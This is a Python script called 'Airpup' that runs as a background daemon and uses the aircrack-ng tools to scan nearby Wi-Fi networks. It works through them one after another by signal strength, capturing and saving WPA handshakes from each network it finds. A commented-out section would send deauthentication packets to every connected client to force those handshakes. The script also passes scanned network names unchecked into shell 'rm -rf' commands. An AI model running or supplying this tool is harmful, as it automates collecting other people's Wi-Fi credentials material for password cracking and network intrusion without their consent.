import os, sys
import time
from subprocess import Popen, call, PIPE

pid = os.fork()
if pid !=0:
    # Running as daemon now.
    sys.exit(0)

# setup airmon assuming we have a wlan0 card
call("sudo airmon-ng stop wlan0mon", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
call("sudo airmon-ng start wlan0 1", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)

# create our captures folder if it doesn't exist
if not os.path.exists("captures"):
    os.makedirs("captures")

# if user forgot an example csv, create one
if not os.path.exists("airpup.csv"):
    f = open("airpup.csv", "w")
    f.write("00:00:00:00:00:00,00:00:00:00:00:01")
    f.close()

# stop airpup if we do not have anymore AP points to discover handshakes with
cellsLeft = True
while cellsLeft == True:
    # check our current AP blacklist
    f = open("airpup.csv", "r")
    blackList = f.read().split(",")
    f.close()
    
    # setup airodump on a timer
    p = Popen("sudo airodump-ng wlan0mon -o csv -w airpuptmp", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)

    # run for 60 seconds, then terminate the process
    timeout = 60
    endtime = time.time() + timeout
    while time.time() < endtime:
        time.sleep(0.4)
    if p.poll() is None:
        p.terminate()
        p.wait()

    # parse the Airodump CSV file
    with open('airpuptmp-01.csv') as f:
        bssids = f.read().split("\r\n\r\n")[0]
        
    # gather all of our AP points
    keys = ['bssid', 'first_seen', 'last_seen', 'channel', 'speed', 'privacy', 'cipher', 'authentication', 'power', 'beacons', 'ivs', 'lan', 'id-length', 'essid', 'key']
    cells = []
    for line in bssids.split('\r\n')[2:]:
        cell = dict(zip(keys, [cell.strip() for cell in line.split(',')]))
        if cell["power"] != '-1': # sometimes we get strays
            cells.append(cell)

    # no more cells to retrieve data from
    if len(cells) == 0:
        cellsLeft = False
        break
            
    # delete our temporary file
    os.remove("airpuptmp-01.csv")

    # lets find the best cell based on the signal strength
    bestCell = None
    bestSignal = 999
    for cell in cells:
        if abs(int(cell["power"])) < bestSignal and 'WPA' in cell["privacy"] and cell["bssid"] not in blackList:
            bestSignal = abs(int(cell["power"]))
            bestCell = cell

    # Target acquired, start airodumping our target bssid
    os.system("rm -rf " + bestCell["bssid"] + "-*") # clean up old entries if we restarted
    p = Popen("sudo airodump-ng wlan0mon -c " + bestCell["channel"] + " --bssid " + bestCell["bssid"] + " -w " + bestCell["bssid"], stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)

    # check the handshake every 10.0 seconds
    checkHandshake = 10.0
    handshakeFound = False
    while handshakeFound == False:
        time.sleep(checkHandshake)
        
        # de-authenticate every client :[]
        # keys = ['mac', 'first_seen', 'last_seen', 'power', '# packets', 'bssid', 'essid']
        # clients = []
        # for line in bssids.split('\r\n')[6:]:
        #     client = dict(zip(keys, [client.strip() for client in line.split(',')]))
        #     clients.append(client)
        
        # for client in clients:
        #     os.system("aireplay-ng -0 5 -a " + bestCell["bssid"] + " -c " + client["mac"] + " wlan0mon")

        # use wpaclean to filter out handshakes and beacons
        call('cp ' + bestCell["bssid"] + '-01.cap tmp.cap', stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
        call('sudo wpaclean airpuptmp.cap tmp.cap', stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
        call('rm -rf tmp.cap', stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
        
        # check to see if our capture file is > 24 bytes (24 bytes = 0 packets)
        try:            
            f = open('airpuptmp.cap', 'rb')
            bytes = f.read()
            f.close()
            if len(bytes) > 24:
                handshakeFound = True
        except IOError:
            pass # do nothing if we didn't find it
      
    # do not dump anymore, we are finished
    if p.poll() is None:
        p.terminate()
        p.wait()
            
    # copy our cleaned capture file to /captures
    call('cp airpuptmp.cap ./captures/' + bestCell["bssid"] + '.cap', stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
    call('rm -rf airpuptmp.cap', stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
    call('rm -rf ' + bestCell["bssid"] + '*', stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)

    # add this AP to our blacklist
    f = open("airpup.csv", "a")
    f.write("," + bestCell["bssid"])
    f.close()

print "No more AP points, Airpup complete [+]"
